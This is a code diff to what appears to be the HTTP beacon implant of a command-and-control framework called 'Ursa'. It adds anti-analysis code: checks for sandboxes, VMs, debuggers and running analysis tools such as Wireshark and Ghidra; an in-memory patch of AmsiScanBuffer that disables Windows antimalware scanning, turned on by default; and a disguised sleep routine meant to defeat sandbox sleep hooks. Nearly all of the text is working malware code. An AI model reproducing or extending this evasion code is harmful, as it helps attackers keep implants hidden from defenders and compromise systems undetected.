@@ -32,9 +32,11 @@ import time
 import random
 import base64
 import re
+import select
 import socket
 import platform
 import subprocess
+import threading
 import urllib.request
 import urllib.error
 import argparse
@@ -63,7 +65,8 @@ _USER_AGENTS = [
     "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_3_1) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.3 Safari/605.1.15",
 ]
 
-# Sandbox/VM indicator databases (inlined for single-file deployability)
+# ── Evasion databases (inlined for single-file deployability) ─────────────────
+
 _VM_MAC_OUIS = frozenset({
     "00:0c:29", "00:50:56", "00:05:69",  # VMware
     "08:00:27",                           # VirtualBox
@@ -83,10 +86,17 @@ _SANDBOX_HOST_RE = re.compile(
     re.IGNORECASE,
 )
 _VM_CPU_STRS = ("hypervisor", "vmware", "virtualbox", "qemu", "kvm", "xen")
+_ANALYSIS_PROCS = frozenset({
+    "wireshark", "tshark", "tcpdump", "fiddler", "burpsuite",
+    "cuckoo", "procmon", "procmon64", "procexp", "procexp64",
+    "x64dbg", "x32dbg", "ollydbg", "windbg", "idaw", "idaq",
+    "ida64", "ghidra", "sandboxie", "sbiesvc", "vboxservice",
+    "vboxtray", "vmwaretray", "vmtoolsd",
+})
 
 
 def _is_sandbox(min_hits: int = 2) -> bool:
-    """Return True if sandbox/VM indicators exceed `min_hits`."""
+    """Return True if sandbox/VM/analysis indicators exceed `min_hits`."""
     hits = 0
 
     # 1. Low uptime (fresh VM)
@@ -143,7 +153,129 @@ def _is_sandbox(min_hits: int = 2) -> bool:
     except Exception:
         pass
 
+    # 7. Low RAM (< 2 GB) — sandboxes are small VMs
+    try:
+        import shutil
+        system = platform.system()
+        ram_mb = 0
+        if system == "Linux":
+            with open("/proc/meminfo") as f:
+                for line in f:
+                    if line.startswith("MemTotal:"):
+                        ram_mb = int(line.split()[1]) // 1024
+                        break
+        elif system == "Darwin":
+            out = subprocess.run(["sysctl", "-n", "hw.memsize"],
+                                 capture_output=True, text=True, timeout=3)
+            ram_mb = int(out.stdout.strip()) // (1024 * 1024)
+        if 0 < ram_mb < 2048:
+            hits += 1
+    except Exception:
+        pass
+
+    # 8. Single CPU core
+    try:
+        if (os.cpu_count() or 2) < 2:
+            hits += 1
+    except Exception:
+        pass
+
+    # 9. Tiny disk (< 60 GB) — fresh sandbox VM
+    try:
+        import shutil
+        root = "C:\\" if platform.system() == "Windows" else "/"
+        total_gb = shutil.disk_usage(root).total / (1024 ** 3)
+        if 0 < total_gb < 60:
+            hits += 1
+    except Exception:
+        pass
+
+    # 10. Debugger attached
+    try:
+        system = platform.system()
+        if system == "Linux":
+            with open("/proc/self/status") as f:
+                for line in f:
+                    if line.startswith("TracerPid:"):
+                        if int(line.split(":")[1].strip()) != 0:
+                            hits += 1
+                        break
+        elif system == "Windows":
+            import ctypes
+            if ctypes.windll.kernel32.IsDebuggerPresent():
+                hits += 1
+    except Exception:
+        pass
+
+    # 11. Known analysis tools running
+    try:
+        if platform.system() == "Windows":
+            out = subprocess.run(["tasklist", "/fo", "csv", "/nh"],
+                                 capture_output=True, text=True, timeout=5)
+        else:
+            out = subprocess.run(["ps", "axo", "comm"],
+                                 capture_output=True, text=True, timeout=5)
+        running = out.stdout.lower()
+        if any(tool in running for tool in _ANALYSIS_PROCS):
+            hits += 1
+    except Exception:
+        pass
+
     return hits >= min_hits
+
+
+def _amsi_bypass() -> bool:
+    """Patch AmsiScanBuffer in amsi.dll to always return clean (Windows only).
+
+    Writes xor eax,eax / ret at AmsiScanBuffer entry so every AMSI
+    scan returns AMSI_RESULT_CLEAN. No-op on non-Windows; returns False.
+    """
+    if platform.system() != "Windows":
+        return False
+    try:
+        import ctypes
+        import ctypes.wintypes
+        k32 = ctypes.windll.kernel32
+        amsi = k32.GetModuleHandleW("amsi.dll") or k32.LoadLibraryW("amsi.dll")
+        if not amsi:
+            return False
+        addr = k32.GetProcAddress(amsi, b"AmsiScanBuffer")
+        if not addr:
+            return False
+        patch = (ctypes.c_char * 3)(0x31, 0xC0, 0xC3)  # xor eax,eax; ret
+        old = ctypes.wintypes.DWORD(0)
+        k32.VirtualProtect(ctypes.c_void_p(addr), 3, 0x40, ctypes.byref(old))
+        ctypes.memmove(ctypes.c_void_p(addr), patch, 3)
+        k32.VirtualProtect(ctypes.c_void_p(addr), 3, old,
+                           ctypes.byref(ctypes.wintypes.DWORD(0)))
+        return True
+    except Exception:
+        return False
+
+
+def _obfuscated_sleep(seconds: float) -> None:
+    """Sleep using four different blocking primitives to foil sleep-hook analysis."""
+    if seconds <= 0:
+        return
+    chunk = seconds / 4.0
+    # 1. threading.Event
+    threading.Event().wait(timeout=chunk)
+    # 2. select() on a self-pipe
+    try:
+        r_fd, w_fd = os.pipe()
+        try:
+            select.select([r_fd], [], [], chunk)
+        finally:
+            os.close(r_fd)
+            os.close(w_fd)
+    except Exception:
+        time.sleep(chunk)
+    # 3. threading.Condition
+    cond = threading.Condition()
+    with cond:
+        cond.wait(timeout=chunk)
+    # 4. residual time.sleep
+    time.sleep(chunk)
 
 
 def _spoof_process_name(name: str) -> bool:
@@ -194,7 +326,7 @@ class UrsaBeacon:
     """HTTP beacon implant for the Ursa C2 framework."""
 
     def __init__(self, server_url, interval=5, jitter=0.3, sandbox_check=True,
-                 process_name=""):
+                 process_name="", amsi_bypass=True):
         self.server = server_url.rstrip("/")
         self.interval = interval
         self.jitter = min(max(float(jitter), 0.0), 1.0)
@@ -208,6 +340,9 @@ class UrsaBeacon:
         # Spoof process name if requested
         if process_name:
             _spoof_process_name(process_name)
+        # Disable AMSI on Windows before any payload activity
+        if amsi_bypass:
+            _amsi_bypass()
 
     # ── Crypto (matches major/crypto.py UrsaCrypto) ──
 
@@ -566,13 +701,13 @@ class UrsaBeacon:
     # ── Main Loop ──
 
     def _jitter_sleep(self):
-        """Sleep with full-range jitter. Occasionally takes a long nap."""
+        """Sleep with full-range jitter using obfuscated multi-primitive sleep."""
         lo = self.interval * max(0.0, 1.0 - self.jitter)
         hi = self.interval * (1.0 + self.jitter)
         # ~5% chance: sleep 5-10× the normal interval to break rhythmic patterns
         if random.random() < 0.05:
             hi = self.interval * random.uniform(5, 10)
-        time.sleep(max(1, random.uniform(lo, hi)))
+        _obfuscated_sleep(max(1.0, random.uniform(lo, hi)))
 
     def run(self):
         """Main beacon loop."""
@@ -611,6 +746,8 @@ def main():
                         help="Skip sandbox/VM detection (useful for testing)")
     parser.add_argument("--process-name", default="",
                         help="Spoof process name shown in ps/top (e.g. 'python3 -m http.server')")
+    parser.add_argument("--no-amsi-bypass", action="store_true",
+                        help="Skip AMSI bypass on Windows (default: bypass enabled)")
     args = parser.parse_args()
 
     beacon = UrsaBeacon(
@@ -619,6 +756,7 @@ def main():
         args.jitter,
         sandbox_check=not args.no_sandbox_check,
         process_name=args.process_name,
+        amsi_bypass=not args.no_amsi_bypass,
     )
     beacon.run()
 
